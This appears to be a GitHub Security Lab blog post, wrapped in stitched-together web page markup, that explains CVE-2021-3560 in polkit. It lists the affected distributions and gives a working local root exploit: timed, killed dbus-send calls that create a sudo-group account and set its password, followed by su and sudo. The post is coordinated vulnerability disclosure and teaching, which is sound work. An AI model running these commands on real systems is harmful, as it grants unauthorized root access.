.299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.65098039215686 0.40392156862745" /><feFuncG type="table" tableValues="0 1" /><feFuncB type="table" tableValues="0.44705882352941 0.4" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;" ><defs><filter id="wp-duotone-blue-orange"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 " /><feComponentTransfer color-interpolation-filters="sRGB" ><feFuncR type="table" tableValues="0.098039215686275 1" /><feFuncG type="table" tableValues="0 0.66274509803922" /><feFuncB type="table" tableValues="0.84705882352941 0.41960784313725" /><feFuncA type="table" tableValues="1 1" /></feComponentTransfer><feComposite in2="SourceGraphic" operator="in" /></filter></defs></svg>
+<header class="position-relative z-3">
+
+		<div data-color-mode="dark" data-light-theme="light" data-dark-theme="dark_dimmed">
+	<nav class="nav-header-with-logo nav-bar-include-search container-xl mx-auto p-responsive position-relative">
+		<div class="d-flex flex-justify-between flex-items-center pt-3 pt-md-4 pb-3 border-bottom color-fg-default">
+
+			<a href="https://github.blog/" class="color-fg-default flex-shrink-0 blog-logo" aria-label="GitHub Blog"><svg width="100" height="40" viewBox="0 0 100 40" fill="currentColor" xmlns="http://www.w3.org/2000/svg" class="d-block">
+						<path fill-rule="evenodd" clip-rule="evenodd" d="M19.9996 4.375C11.1749 4.375 4.02734 11.5226 4.02734 20.3472C4.02734 27.4149 8.59939 33.3845 14.9484 35.5009C15.747 35.6406 16.0464 35.1615 16.0464 34.7422C16.0464 34.3628 16.0265 33.105 16.0265 31.7674C12.0135 32.5061 10.9753 30.7891 10.6558 29.8906C10.4761 29.4314 9.69748 28.0139 9.01866 27.6345C8.45964 27.3351 7.66102 26.5964 8.9987 26.5764C10.2565 26.5564 11.1549 27.7344 11.4544 28.2135C12.8919 30.6293 15.1879 29.9505 16.1063 29.5312C16.2461 28.4931 16.6654 27.7943 17.1246 27.395C13.5707 26.9957 9.85721 25.6181 9.85721 19.5087C9.85721 17.7717 10.4761 16.3342 11.4944 15.2161C11.3346 14.8168 10.7756 13.1797 11.6541 10.9835C11.6541 10.9835 12.9918 10.5642 16.0464 12.6207C17.3242 12.2613 18.6819 12.0816 20.0395 12.0816C21.3971 12.0816 22.7548 12.2613 24.0326 12.6207C27.0872 10.5443 28.4249 10.9835 28.4249 10.9835C29.3034 13.1797 28.7444 14.8168 28.5846 15.2161C29.6029 16.3342 30.2218 17.7517 30.2218 19.5087C30.2218 25.638 26.4883 26.9957 22.9345 27.395C23.5135 27.8941 24.0126 28.8524 24.0126 30.3498C24.0126 32.4861 23.9926 34.2031 23.9926 34.7422C23.9926 35.1615 24.2921 35.6606 25.0907 35.5009C31.3997 33.3845 35.9718 27.395 35.9718 20.3472C35.9718 11.5226 28.8242 4.375 19.9996 4.375Z"/>
+						<path d="M52.8652 29C56.8757 29 59.3105 26.9688 59.3105 23.6615C59.3105 21.1745 57.5267 19.3385 54.9746 19.0911V18.987C56.9017 18.6745 58.3991 16.9167 58.3991 14.8984C58.3991 12.0469 56.1986 10.2109 52.7871 10.2109H44.9876V29H52.8652ZM48.347 12.8281H51.9408C53.946 12.8281 55.0788 13.7526 55.0788 15.3932C55.0788 17.138 53.7637 18.1276 51.4199 18.1276H48.347V12.8281ZM48.347 26.3828V20.5104H51.9538C54.5319 20.5104 55.8861 21.513 55.8861 23.4271C55.8861 25.3542 54.571 26.3828 52.097 26.3828H48.347ZM61.472 29H64.7142V10.2109H61.472V29ZM73.5814 29.2734C77.6309 29.2734 80.2611 26.5781 80.2611 22.099C80.2611 17.6328 77.6048 14.9115 73.5814 14.9115C69.5579 14.9115 66.9017 17.6458 66.9017 22.099C66.9017 26.5781 69.5319 29.2734 73.5814 29.2734ZM73.5814 26.7083C71.5241 26.7083 70.196 25.0417 70.196 22.099C70.196 19.1693 71.5371 17.4896 73.5814 17.4896C75.6387 17.4896 76.9668 19.1693 76.9668 22.099C76.9668 25.0417 75.6387 26.7083 73.5814 26.7083ZM88.4251 34.2083C92.4486 34.2083 95.0918 32.0729 95.0918 28.7786V15.1979H91.9147V17.5677H91.8626C91.0684 15.9792 89.4798 14.9635 87.5137 14.9635C83.985 14.9635 81.7715 17.6849 81.7715 22.0469C81.7715 26.3438 84.0371 29.013 87.4486 29.013C89.4277 29.013 91.0553 28.0234 91.7715 26.5391H91.8496V28.8698C91.8496 30.6276 90.6387 31.8125 88.5293 31.8125C86.9928 31.8125 85.8079 31.0964 85.4564 30.0417H82.2402C82.5658 32.4635 85.0137 34.2083 88.4251 34.2083ZM88.4381 26.4349C86.3939 26.4349 85.0918 24.7943 85.0918 22.0599C85.0918 19.3516 86.3939 17.6328 88.4381 17.6328C90.5085 17.6328 91.8496 19.3776 91.8496 22.0599C91.8496 24.7552 90.5085 26.4349 88.4381 26.4349Z"/>
+					</svg></a>
+			<ul class="d-flex flex-row flex-nowrap overflow-hidden flex-grow-0 list-style-none js-p-target" style="margin-left: auto;">
+			<li class="ml-4"><a href="https://github.blog/category/engineering/" class="d-block no-wrap f4-mktg color-fg-default text-medium">Engineering</a></li><li class="ml-4"><a href="https://github.blog/category/community/" class="d-block no-wrap f4-mktg color-fg-default text-medium">Community</a></li><li class="ml-4"><a href="https://github.blog/category/product/" class="d-block no-wrap f4-mktg color-fg-default text-medium">Product</a></li><li class="ml-4"><a href="https://github.blog/category/security/" class="d-block no-wrap f4-mktg color-fg-default text-medium">Security</a></li><li class="ml-4"><a href="https://github.blog/category/open-source/" class="d-block no-wrap f4-mktg color-fg-default text-medium">Open Source</a></li><li class="ml-4"><a href="https://github.blog/category/enterprise/" class="d-block no-wrap f4-mktg color-fg-default text-medium">Enterprise</a></li><li class="ml-4"><a href="https://github.blog/category/education/" class="d-block no-wrap f4-mktg color-fg-default text-medium">Education</a></li><li class="ml-4"><a href="https://github.blog/category/company/" class="d-block no-wrap f4-mktg color-fg-default text-medium">Company</a></li><li class="ml-4"><a href="https://github.blog/changelog/" class="d-block no-wrap f4-mktg color-fg-default text-medium">Changelog</a></li>			</ul>
+
+			<a role="button" aria-label="Search toggle" href="#" class="ml-4 color-fg-default search-field-icon-toggle js-search-toggle" aria-expanded="false" aria-controls="js-header-search">
+				<svg height="20" class="octicon octicon-search d-block mt-1" aria-hidden="true" viewBox="0 0 16 16" version="1.1" width="20" role="img"><path fill-rule="evenodd" d="M11.5 7a4.499 4.499 0 11-8.998 0A4.499 4.499 0 0111.5 7zm-.82 4.74a6 6 0 111.06-1.06l3.04 3.04a.75.75 0 11-1.06 1.06l-3.04-3.04z"></path></svg>
+			</a>
+
+			<div id="js-header-search" class="header-search color-bg-primary box-shadow-large p-3" hidden>
+	<form role="search" method="get" class="header-search__form col-12" action="https://github.blog">
+		<label class="search-form__label screen-reader-text" for="search-input">Search by Keyword</label>
+
+		<div class="header-search__form-fields d-flex flex-row flex-items-center">
+			<input type="search" class="search-field form-control flex-auto p-2 mr-2" placeholder="Search …" value="" name="s" id="search-input">
+
+			<div class="site-search__submit ml-2">
+				<button type="submit" class="btn btn-outline px-4 py-2 search-submit">
+					Search				</button>
 			</div>
-		</form>
-	</div>
-</div>
-
 		</div>
-	</div>
-	
-
-<div id="mw-panel">
-	<div id="p-logo" role="banner">
-		<a class="mw-wiki-logo" href="https://foundation.wikimedia.org/wiki/Home"
-			title="Visit the main page"></a>
-	</div>
-	
-<nav id="p-navigation" class="mw-portlet mw-portlet-navigation vector-menu vector-menu-portal portal" aria-labelledby="p-navigation-label" role="navigation" 
-	 >
-	<label id="p-navigation-label" aria-label="" class="vector-menu-heading "  >
-		<span class="vector-menu-heading-label">Navigation</span>
-	</label>
-	<div class="vector-menu-content">
-		
-		<ul class="vector-menu-content-list"><li id="n-Support-pages-index" class="mw-list-item"><a href="/wiki/Support_pages_index"><span>Support pages index</span></a></li><li id="n-Other-ways-to-give" class="mw-list-item"><a href="/wiki/Other_ways_to_give"><span>Other ways to give</span></a></li><li id="n-Problems-donating" class="mw-list-item"><a href="/wiki/Problems_donating"><span>Problems donating</span></a></li><li id="n-Cancel-or-change-recurring-giving" class="mw-list-item"><a href="/wiki/Cancel_or_change_recurring_giving"><span>Cancel or change recurring giving</span></a></li><li id="n-Matching-Gifts" class="mw-list-item"><a href="/wiki/Matching_Gifts"><span>Matching Gifts</span></a></li></ul>
-		
-	</div>
-</nav>
-
-	
-<nav id="p-Wiki" class="mw-portlet mw-portlet-Wiki vector-menu vector-menu-portal portal" aria-labelledby="p-Wiki-label" role="navigation" 
-	 >
-	<label id="p-Wiki-label" aria-label="" class="vector-menu-heading "  >
-		<span class="vector-menu-heading-label">Wiki</span>
-	</label>
-	<div class="vector-menu-content">
-		
-		<ul class="vector-menu-content-list"><li id="n-Recent-changes" class="mw-list-item"><a href="/wiki/Special:RecentChanges"><span>Recent changes</span></a></li><li id="n-Documentation-(collab)" class="mw-list-item"><a href="https://collab.wikimedia.org/wiki/Fundraising/Donatewiki_documentation"><span>Documentation (collab)</span></a></li></ul>
-		
-	</div>
-</nav>
-
-<nav id="p-tb" class="mw-portlet mw-portlet-tb vector-menu vector-menu-portal portal" aria-labelledby="p-tb-label" role="navigation" 
-	 >
-	<label id="p-tb-label" aria-label="" class="vector-menu-heading "  >
-		<span class="vector-menu-heading-label">Tools</span>
-	</label>
-	<div class="vector-menu-content">
-		
-		<ul class="vector-menu-content-list"><li id="t-specialpages" class="mw-list-item"><a href="/wiki/Special:SpecialPages" title="A list of all special pages [q]" accesskey="q"><span>Special pages</span></a></li><li id="t-print" class="mw-list-item"><a href="javascript:print();" rel="alternate" title="Printable version of this page [p]" accesskey="p"><span>Printable version</span></a></li></ul>
-		
-	</div>
-</nav>
-
-	
+	</form>
+</div>
+		</div>
+	</nav>
 </div>
 
+</header>
+<div class="overflow-hidden">
+<section class="position-relative" data-color-mode="dark" data-light-theme="light" data-dark-theme="dark_dimmed">
+  <div class="container-xl p-responsive">
+    <div class="gutter-spacious pt-1 ">
+      <div class="col-12 offset-lg-1 col-lg-10 col-xl-7 mt-5 mt-lg-10 mb-6 mb-lg-8">
+      <ul class="d-inline-block list-style-none mb-12px post-hero__categories"><li class="d-inline-block mr-3"><a href="https://github.blog/category/security/" class="f4-mktg text-gradient-purple-coral text-bold">Security</a></li></ul><h1 class="h3-mktg lh-condensed mb-3 color-fg-default">Privilege escalation with polkit: How to get root on Linux with a seven-year-old bug</h1><p class="f4-mktg color-fg-muted">polkit is a system service installed by default on many Linux distributions. It’s used by systemd, so any Linux distribution that uses systemd also uses polkit.</p>      </div>
+              <div class="offset-lg-1 col-lg-10">
+          <div class="position-relative z-1">
+            <svg aria-hidden="true" width="1032" height="548" class="width-full height-auto d-block" style="visibility: hidden; pointer-events: none;"></svg>
+            <img srcset="https://github.blog/wp-content/uploads/2019/09/security-1200-630.png?resize=800%2C425 800w,https://github.blog/wp-content/uploads/2019/09/security-1200-630.png?resize=1200%2C630 1600w" src="https://github.blog/wp-content/uploads/2019/09/security-1200-630.png?resize=1200%2C630" width="1600" height="850" alt="Privilege escalation with polkit: How to get root on Linux with a seven-year-old bug" class="cover-image rounded-2" />          </div>
+        </div>
+          </div>
+  </div>
+      <div class="position-absolute bottom-0 width-full" style="background:#fff; height:80px;"></div>
+  </section>
+
+<section class="container-xl mx-auto p-responsive" style="margin-top: 20px;">
+  <div class="gutter-spacious">
+    <div class="col-12 offset-lg-1 col-lg-10">
+            <div class="text-mono f5-mktg color-text-secondary mb-12px">Author</div>
+            <div class="d-flex flex-nowrap pb-1 flex-items-start">
+                <div class="d-flex flex-wrap">
+                      <a href="https://github.blog/author/kevinbackhouse/" class="d-flex flex-nowrap flex-items-center Link--primary f4-mktg text-bold mb-3 mr-4 mr-lg-5" style="line-height: 1.25 !important;">
+              <img src="https://avatars.githubusercontent.com/u/4358136?v=4&#038;s=200" class="d-block height-auto circle byline__photo--recirc mr-14px" alt="Kevin Backhouse" width="40" height="40" />Kevin Backhouse            </a>
+                  </div>
+                <span class="d-block border-left flex-shrink-0 text-mono f5-mktg color-text-secondary mb-3" style="margin-left: auto; padding-left: 28px; min-height: 28px; line-height: 28px !important; margin-top: 8px;">
+          June 10, 2021        </span>
+      </div>
+      <div class="indigo-separator"></div>
+    </div>
+  </div>
+</section>
+<div class="container-xl mx-auto p-responsive mt-4 mt-md-7 mb-7 mb-md-9">
+  <div class="d-flex flex-wrap gutter-spacious">
+    
+<div class="col-12 offset-lg-1 col-lg-1 post__social">
+	<ul class="list-style-none d-flex flex-lg-column">
+
+		<li class="mr-4 mr-lg-0 mb-4">
+			<a href="https://twitter.com/share?text=Privilege escalation with polkit: How to get root on Linux with a seven-year-old bug&url=https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/" target="_blank" rel="noopener noreferrer" class="d-flex flex-justify-center flex-items-center border circle gh-social-aside" aria-label="Share on Twitter">
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 273.5 222.3" height="18">
+					<path d="M273.5 26.3a109.77 109.77 0 0 1-32.2 8.8 56.07 56.07 0 0 0 24.7-31 113.39 113.39 0 0 1-35.7 13.6 56.1 56.1 0 0 0-97 38.4 54 54 0 0 0 1.5 12.8A159.68 159.68 0 0 1 19.1 10.3a56.12 56.12 0 0 0 17.4 74.9 56.06 56.06 0 0 1-25.4-7v.7a56.11 56.11 0 0 0 45 55 55.65 55.65 0 0 1-14.8 2 62.39 62.39 0 0 1-10.6-1 56.24 56.24 0 0 0 52.4 39 112.87 112.87 0 0 1-69.7 24 119 119 0 0 1-13.4-.8 158.83 158.83 0 0 0 86 25.2c103.2 0 159.6-85.5 159.6-159.6 0-2.4-.1-4.9-.2-7.3a114.25 114.25 0 0 0 28.1-29.1" fill="currentColor" /></path>
+				</svg>
+			</a>
+		</li>
+		<li class="mr-4 mr-lg-0 mb-4">
+			<a href="https://www.facebook.com/sharer/sharer.php?u=https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/&t=Privilege%20escalation%20with%20polkit%3A%20How%20to%20get%20root%20on%20Linux%20with%20a%20seven-year-old%20bug" target="_blank" rel="noopener noreferrer" class="d-flex flex-justify-center flex-items-center border circle gh-social-aside" aria-label="Share on Facebook">
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.3 15.4" height="18">
+					<path d="M14.5 0H.8a.88.88 0 0 0-.8.9v13.6a.88.88 0 0 0 .8.9h7.3v-6h-2V7.1h2V5.4a2.87 2.87 0 0 1 2.5-3.1h.5a10.87 10.87 0 0 1 1.8.1v2.1h-1.3c-1 0-1.1.5-1.1 1.1v1.5h2.3l-.3 2.3h-2v5.9h3.9a.88.88 0 0 0 .9-.8V.8a.86.86 0 0 0-.8-.8z" fill="currentColor" /></path>
+				</svg>
+			</a>
+		</li>
+		<li class="mr-4 mr-lg-0 mb-4">
+			<a href="https://www.linkedin.com/shareArticle?url=https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/&title=Privilege%20escalation%20with%20polkit%3A%20How%20to%20get%20root%20on%20Linux%20with%20a%20seven-year-old%20bug" target="_blank" rel="noopener noreferrer" class="d-flex flex-justify-center flex-items-center border circle gh-social-aside" aria-label="Share on LinkedIn">
+				<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19 18" height="18">
+					<path d="M3.94 2A2 2 0 1 1 2 0a2 2 0 0 1 1.94 2zM4 5.48H0V18h4zm6.32 0H6.34V18h3.94v-6.57c0-3.66 4.77-4 4.77 0V18H19v-7.93c0-6.17-7.06-5.94-8.72-2.91z" fill="currentColor" /></path>
+				</svg>
+			</a>
+		</li>
+
+	</ul>
 </div>
 
-<footer id="footer" class="mw-footer" role="contentinfo" >
-	<ul id="footer-info">
+<main role="main" id="post-58581" class="col-12 col-lg-7 post__content col-md-8 post-58581 post type-post status-publish format-standard has-post-thumbnail hentry category-security tag-github-security-lab">
+  <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" "http://www.w3.org/TR/REC-html40/loose.dtd">
+<html><body><p><a href="https://gitlab.freedesktop.org/polkit/polkit/" rel="noopener" target="_blank">polkit</a> is a system service installed by default on many Linux distributions. It&rsquo;s used by <a href="https://systemd.io/" rel="noopener" target="_blank">systemd</a>, so any Linux distribution that uses systemd also uses polkit. As a member of <a href="https://securitylab.github.com/" rel="noopener" target="_blank">GitHub Security Lab</a>, my job is to help improve the security of open source software by finding and reporting vulnerabilities. A few weeks ago, I found a privilege escalation vulnerability in polkit. I coordinated the disclosure of the vulnerability with the polkit maintainers and with <a href="https://access.redhat.com/security/overview/" rel="noopener" target="_blank">Red Hat&rsquo;s security team.</a> It was publicly disclosed, the fix was released on June 3, 2021, and it was assigned <a href="https://access.redhat.com/security/cve/CVE-2021-3560" rel="noopener" target="_blank">CVE-2021-3560</a>.</p>
+<p>The vulnerability enables an unprivileged local user to get a root shell on the system. It&rsquo;s easy to exploit with a few standard command line tools, as you can see in this <a href="https://youtu.be/QZhz64yEd0g" rel="noopener" target="_blank">short video</a>. In this blog post, I&rsquo;ll explain how the exploit works and show you where the bug was in the source code.</p>
+<details open>
+<summary><strong>Table of contents</strong></summary>
+
+<ul>
+<li><a href="#history">History of CVE-2021-3560 and vulnerable distributions</a></li>
+<li><a href="#about">About polkit</a></li>
+<li><a href="#exploitation">Exploitation steps</a></li>
+<li><a href="#architecture">polkit architecture</a></li>
+<li><a href="#vulnerability">The vulnerability</a></li>
+<li><a href="#annotations">org.freedesktop.policykit.imply annotations</a></li>
+<li><a href="#conclusion">Conclusion</a></li>
 </ul>
+</details>
+<h2><a id="history">History</a> of CVE-2021-3560 and vulnerable distributions</h2>
+<p>The bug I found was quite old. It was introduced seven years ago in commit <a href="https://gitlab.freedesktop.org/polkit/polkit/-/commit/bfa5036bfb93582c5a87c44b847957479d911e38" rel="noopener" target="_blank">bfa5036</a> and first shipped with polkit version 0.113. However, many of the most popular Linux distributions didn&rsquo;t ship the vulnerable version until more recently.</p>
+<p>The bug has a slightly different history on <a href="https://www.debian.org/" rel="noopener" target="_blank">Debian</a> and its derivatives (such as <a href="https://ubuntu.com/" rel="noopener" target="_blank">Ubuntu</a>), because Debian uses a <a href="https://salsa.debian.org/utopia-team/polkit" rel="noopener" target="_blank">fork of polkit</a> with a different version numbering scheme. In the Debian fork, the bug was introduced in commit <a href="https://salsa.debian.org/utopia-team/polkit/-/commit/f81d021e3cb97a0816285eb95c2a77f554d30966" rel="noopener" target="_blank">f81d021</a> and first shipped with version 0.105-26. The most recent stable release of Debian, <a href="https://www.debian.org/releases/buster/" rel="noopener" target="_blank">Debian 10 (&ldquo;buster&rdquo;)</a>, uses version 0.105-25, which means that it isn&rsquo;t vulnerable. However, some Debian derivatives, such as Ubuntu, are based on <a href="https://www.debian.org/releases/sid/" rel="noopener" target="_blank">Debian unstable</a>, which is vulnerable.</p>
+<p>Here&rsquo;s a table with a selection of popular distributions and whether they&rsquo;re vulnerable (note that this isn&rsquo;t a comprehensive list):</p>
+<table>
+<tbody>
+<tr>
+<th>Distribution</th>
+<th>Vulnerable?</th>
+</tr>
+<tr>
+<td>RHEL 7</td>
+<td>No</td>
+</tr>
+<tr>
+<td>RHEL 8</td>
+<td><a href="https://access.redhat.com/security/cve/CVE-2021-3560" rel="noopener" target="_blank">Yes</a></td>
+</tr>
+<tr>
+<td>Fedora 20 (or earlier)</td>
+<td>No</td>
+</tr>
+<tr>
+<td>Fedora 21 (or later)</td>
+<td><a href="https://bugzilla.redhat.com/show_bug.cgi?id=1967424" rel="noopener" target="_blank">Yes</a></td>
+</tr>
+<tr>
+<td>Debian 10 (&ldquo;buster&rdquo;)</td>
+<td>No</td>
+</tr>
+<tr>
+<td>Debian testing (&ldquo;bullseye&rdquo;)</td>
+<td><a href="https://security-tracker.debian.org/tracker/CVE-2021-3560" rel="noopener" target="_blank">Yes</a></td>
+</tr>
+<tr>
+<td>Ubuntu 18.04</td>
+<td>No</td>
+</tr>
+<tr>
+<td>Ubuntu 20.04</td>
+<td><a href="https://ubuntu.com/security/CVE-2021-3560" rel="noopener" target="_blank">Yes</a></td>
+</tr>
+</tbody>
+</table>
+<h2><a id="about">About</a> polkit</h2>
+<p><a href="https://gitlab.freedesktop.org/polkit/polkit/" rel="noopener" target="_blank">polkit</a> is the system service that&rsquo;s running under the hood when you see a dialog box like the one below:</p>
+<p class="has-image"><img src="https://github.blog/wp-content/uploads/2021/06/polkit-fig-5.png?w=1024&#038;resize=1024%2C576" alt="Screenshot of polkit dialog box prompting authentication" width="1024" height="576" class="alignleft size-large wp-image-58601" srcset="https://github.blog/wp-content/uploads/2021/06/polkit-fig-5.png?w=1600 1600w, https://github.blog/wp-content/uploads/2021/06/polkit-fig-5.png?w=300 300w, https://github.blog/wp-content/uploads/2021/06/polkit-fig-5.png?w=768 768w, https://github.blog/wp-content/uploads/2021/06/polkit-fig-5.png?w=1024&#038;resize=1024%2C576 1024w, https://github.blog/wp-content/uploads/2021/06/polkit-fig-5.png?w=1536 1536w" sizes="(max-width: 1000px) 100vw, 1000px" loading="lazy" data-recalc-dims="1"></p>
+<p>It essentially plays the role of a judge. If you want to do something that requires higher privileges&mdash;for example, creating a new user account&mdash;then it&rsquo;s polkit&rsquo;s job to decide whether or not you&rsquo;re allowed to do it. For some requests, polkit will make an instant decision to allow or deny, and for others it will pop up a dialog box so that an administrator can grant authorization by entering their password.</p>
+<p>The dialog box might give the impression that polkit is a graphical system, but it&rsquo;s actually a background process. The dialog box is known as an <em>authentication agent</em> and it&rsquo;s really just a mechanism for sending your password to polkit. To illustrate that polkit isn&rsquo;t just for graphical sessions, try running this command in a terminal:</p>
+<pre>pkexec reboot</pre>
+<p><a href="https://manpages.ubuntu.com/manpages/focal/en/man1/pkexec.1.html" rel="noopener" target="_blank"><code>pkexec</code></a> is a similar command to <a href="https://manpages.ubuntu.com/manpages/focal/en/man8/sudo.8.html" rel="noopener" target="_blank"><code>sudo</code></a>, which enables you to run a command as root. If you run <code>pkexec</code> in a graphical session, it will pop up a dialog box, but if you run it in a text-mode session such as SSH then it starts its own text-mode authentication agent:</p>
+<pre>$ pkexec reboot
+==== AUTHENTICATING FOR org.freedesktop.policykit.exec ===
+Authentication is needed to run `/usr/sbin/reboot' as the super user
+Authenticating as: Kevin Backhouse,,, (kev)
+Password:</pre>
+<p>Another command that you can use to trigger <code>polkit</code> from the command line is <a href="https://manpages.ubuntu.com/manpages/focal/en/man1/dbus-send.1.html" rel="noopener" target="_blank"><code>dbus-send</code></a>. It&rsquo;s a general purpose tool for sending D-Bus messages that&rsquo;s mainly used for testing, but it&rsquo;s usually installed by default on systems that use D-Bus. It can be used to simulate the D-Bus messages that the graphical interface might send. For example, this is the command to create a new user:</p>
+<pre>dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1</pre>
+<p>If you run that command in a graphical session, an authentication dialog box will pop up, but if you run it in a text-mode session such as <a href="https://www.openssh.com/" rel="noopener" target="_blank">SSH</a>, then it fails immediately. That&rsquo;s because, unlike <code>pkexec</code>, <code>dbus-send</code> does not start its own authentication agent.</p>
+<h2><a id="exploitation">Exploitation</a> steps</h2>
+<p>The vulnerability is surprisingly easy to exploit. All it takes is a few commands in the terminal using only standard tools like <a href="https://manpages.ubuntu.com/manpages/focal/en/man1/bash.1.html" rel="noopener" target="_blank"><code>bash</code></a>, <a href="https://manpages.ubuntu.com/manpages/focal/en/man1/kill.1.html" rel="noopener" target="_blank"><code>kill</code></a>, and <a href="https://manpages.ubuntu.com/manpages/focal/en/man1/dbus-send.1.html" rel="noopener" target="_blank"><code>dbus-send</code></a>.</p>
+<p>The proof of concept (PoC) exploit I describe in this section depends on two packages being installed: <code>accountsservice</code> and <code>gnome-control-center</code>. On a graphical system such as Ubuntu Desktop, both of those packages are usually installed by default. But if you&rsquo;re using something like a non-graphical RHEL server, then you might need to install them, like this:</p>
+<pre>sudo yum install accountsservice gnome-control-center</pre>
+<p>Of course, the vulnerability doesn&rsquo;t have anything specifically to do with either <code>accountsservice</code> or <code>gnome-control-center</code>. They&rsquo;re just polkit clients that happen to be convenient vectors for exploitation. The reason why the PoC depends on <code>gnome-control-center</code> and not just <code>accountsservice</code> is subtle&mdash;I&rsquo;ll explain that <a href="#annotations">later</a>.</p>
+<p>To avoid repeatedly triggering the authentication dialog box (which can be annoying), I recommend running the commands from an SSH session:</p>
+<pre>ssh localhost</pre>
+<p>The vulnerability is triggered by starting a <code>dbus-send</code> command but killing it while polkit is still in the middle of processing the request. I like to think that it&rsquo;s theoretically possible to trigger by smashing Ctrl+C at just the right moment, but I&rsquo;ve never succeeded, so I do it with a small amount of bash scripting instead. First, you need to measure how long it takes to run the <code>dbus-send</code> command normally:</p>
+<pre>time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1</pre>
+<p>The output will look something like this:</p>
+<pre>Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
 
-	<ul id="footer-places">
-	<li id="footer-places-privacy"><a href="https://foundation.wikimedia.org/wiki/Project:Privacy_policy" class="extiw" title="wmf:Project:Privacy policy">Privacy policy</a></li>
-	<li id="footer-places-about"><a href="https://foundation.wikimedia.org/wiki/Project:About" class="extiw" title="wmf:Project:About">About Donate</a></li>
-	<li id="footer-places-disclaimer"><a href="https://foundation.wikimedia.org/wiki/Project:General_disclaimer" class="extiw" title="wmf:Project:General disclaimer">Disclaimers</a></li>
-	<li id="footer-places-mobileview"><a href="//donate.m.wikimedia.org/w/index.php?title=Special:LandingPage&amp;country=XX&amp;uselang=en&amp;utm_medium=wmfSite&amp;utm_source=101&amp;utm_campaign=navButton&amp;mobileaction=toggle_view_mobile" class="noprint stopMobileRedirectToggle">Mobile view</a></li>
-	<li id="footer-places-developers"><a href="https://www.mediawiki.org/wiki/Special:MyLanguage/How_to_contribute">Developers</a></li>
-	<li id="footer-places-statslink"><a href="https://stats.wikimedia.org/#/donate.wikimedia.org">Statistics</a></li>
-	<li id="footer-places-cookiestatement"><a href="https://foundation.wikimedia.org/wiki/Cookie_statement">Cookie statement</a></li>
-</ul>
+real 0m0.016s
+user 0m0.005s
+sys 0m0.000s</pre>
+<p>That took 16 milliseconds for me, so that means that I need to kill the <code>dbus-send</code> command after approximately 8 milliseconds:</p>
+<pre>dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1 &amp; sleep 0.008s ; kill $!</pre>
+<p>You might need to run that a few times, and you might need to experiment with the number of milliseconds in the delay. When the exploit succeeds, you&rsquo;ll see that a new user named <code>boris</code> has been created:</p>
+<pre>$ id boris
+uid=1002(boris) gid=1002(boris) groups=1002(boris),27(sudo)</pre>
+<p>Notice that <code>boris</code> is a member of the <code>sudo</code> group, so you&rsquo;re already well on your way to full privilege escalation. Next, you need to set a password for the new account. The D-Bus interface expects a hashed password, which you can create using <code>openssl</code>:</p>
+<pre>$ openssl passwd -5 iaminvincible!
+$5$Fv2PqfurMmI879J7$ALSJ.w4KTP.mHrHxM2FYV3ueSipCf/QSfQUlATmWuuB</pre>
+<p>Now you just have to do the same trick again, except this time call the <code>SetPassword</code> D-Bus method:</p>
+<pre>dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1002 org.freedesktop.Accounts.User.SetPassword string:'$5$Fv2PqfurMmI879J7$ALSJ.w4KTP.mHrHxM2FYV3ueSipCf/QSfQUlATmWuuB' string:GoldenEye &amp; sleep 0.008s ; kill $!</pre>
+<p>Again, you might need to experiment with the length of the delay and run it several times until it succeeds. Also, note that you need to paste in the correct user identifier (UID), which is &ldquo;1002&rdquo; in this example, plus the password hash from the <code>openssl</code> command.</p>
+<p>Now you can login as boris and become root:</p>
+<pre>su - boris # password: iaminvincible!
+sudo su # password: iaminvincible!</pre>
+<p class="has-image"><img loading="lazy" src="https://github.blog/wp-content/uploads/2021/06/polkit-invincible.jpeg?w=600&#038;resize=600%2C255" alt="" width="600" height="255" class="alignleft size-large wp-image-58602" srcset="https://github.blog/wp-content/uploads/2021/06/polkit-invincible.jpeg?w=600&#038;resize=600%2C255 600w, https://github.blog/wp-content/uploads/2021/06/polkit-invincible.jpeg?w=300 300w" sizes="(max-width: 600px) 100vw, 600px" data-recalc-dims="1"></p>
+<h2>polkit <a id="architecture">architecture</a></h2>
+<p>To help explain the vulnerability, here&rsquo;s a diagram of the five main processes involved during the <code>dbus-send</code> command:</p>
